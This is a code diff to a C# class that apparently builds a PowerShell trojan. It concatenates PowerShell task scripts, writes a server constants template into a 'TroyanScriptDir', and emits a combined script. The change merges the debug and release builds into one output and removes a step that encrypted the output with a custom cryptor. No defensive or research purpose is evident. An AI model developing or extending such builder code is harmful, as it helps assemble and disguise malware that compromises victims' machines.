@@ -12,8 +12,6 @@ public abstract class CustomBuilder
     protected abstract string SourceDir {get;}
     
     protected abstract string OutputFile { get; }
-    protected abstract string OutputReleaseFile { get; }
-    protected abstract string OutputDebugFile { get; }
     protected abstract string[] PrioritySources { get; }
 
     protected string[] PriorityLinks => PrioritySources.Select(x => $". ./{x}.ps1")
@@ -26,6 +24,12 @@ public abstract class CustomBuilder
     private ServerService Svc;
     protected ServerModel Model = new();
     private List<string> SourceFiles;
+    private Dictionary<string, string> SourceData = new Dictionary<string, string>();
+    private List<string> DoFiles => SourceFiles
+        .Except(PrioritySources)
+        .Where(a=> !a.StartsWith("sub_")).Where(a=>!IgnoreTasks.Contains(a))
+        .SortWithPriority(PriorityTasks, UnpriorityTasks).ToList();
+    
     private readonly StringBuilder Builder = new();
     protected readonly List<string> Result = new();
     
@@ -38,12 +42,11 @@ public abstract class CustomBuilder
         InternalBuild(server);
         SourceFiles = GetSourceFiles();
         CompileSources();
-        var directoryPath = Path.GetDirectoryName(OutputReleaseFile);
+        var directoryPath = Path.GetDirectoryName(OutputFile);
         if (!string.IsNullOrEmpty(directoryPath) && !Directory.Exists(directoryPath))
             Directory.CreateDirectory(directoryPath);
         
-        BuildDebug();
-        BuildRelease();
+        Build();
 
         return Result;
     }
@@ -83,29 +86,47 @@ _SERVER
         var outputPath = Path.Combine(Model.TroyanScriptDir, "consts_body.ps1");
         File.WriteAllText(outputPath, template);
     }
+    
+    private bool IsDebug => this.GetType().Name.Contains("Debug");
 
-
+    private void Build()
+    {
+        if (IsDebug)
+        {
+            BuildDebug();
+        }
+        else
+        {
+            BuildRelease();
+        }
+    }
+    
     private void BuildDebug()
     {
-        var doo = BuildDo();
-        var data = Builder.ToString();
-        var dataDebug = data + Environment.NewLine + doo;
-        File.WriteAllText(OutputDebugFile,dataDebug);
+        FlushSources();
+        Builder.AppendLine("");
+        foreach (var sourceFile in DoFiles)
+        {
+            var doX = $"do_{sourceFile}";
+            Builder.AppendLine(doX);
+        }
+        
+        File.WriteAllText(OutputFile,Builder.ToString());
     }
 
     private void BuildRelease()
     {
-        var doo = BuildDo();
-        var doSplit = doo.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None).Where(x => x.Contains("do_")).ToArray();
-        doSplit = doSplit.Select(x => $"'{x}'").ToArray();
-        doo = string.Join(',', doSplit);
+        var psString = new StringBuilder();
+        foreach (var kvp in SourceData)
+            psString.AppendLine($"    \"{kvp.Key}\" = \"{kvp.Value}\"");
+        var doo = psString.ToString();
+        
         var dataProd = Builder.ToString();
         var programRaw = ReadSource("program");
         (var head, var body) = ExtractHeadAndBody(programRaw);
         body = body.Replace("###doo", doo);
         dataProd = head + Environment.NewLine + dataProd + Environment.NewLine + body;
-        File.WriteAllText(OutputReleaseFile,dataProd);
-        CustomCryptor.Encode(dataProd, OutputFile);
+        File.WriteAllText(OutputFile,Builder.ToString());
     }
 
     protected abstract void InternalBuild(string server);
@@ -115,7 +136,15 @@ _SERVER
         foreach (var sourceFile in SourceFiles)
         {
             var data = ReadSource(sourceFile);
-            Builder.Append(data);
+            SourceData.Add(sourceFile, data);
+        }
+    }
+
+    private void FlushSources()
+    {
+        foreach (var x in SourceData)
+        {
+            Builder.Append(x.Value);
             Builder.AppendLine();
         }
     }
@@ -150,23 +179,6 @@ _SERVER
         var result = string.Join(Environment.NewLine, filteredLines);
 
         return result;
-    }
-    
-    private string BuildDo()
-    {
-        var sourceFiles = SourceFiles
-            .Except(PrioritySources)
-            .Where(a=> !a.StartsWith("sub_"))
-            .SortWithPriority(PriorityTasks, UnpriorityTasks).ToArray();
-        var doBuilder = new StringBuilder();
-        foreach (var sourceFile in sourceFiles)
-        {
-            if (IgnoreTasks.Contains(sourceFile))
-                continue;
-            var doX = $"do_{sourceFile}";
-            doBuilder.AppendLine(doX);
-        }
-        return doBuilder.ToString();
     }
     
     
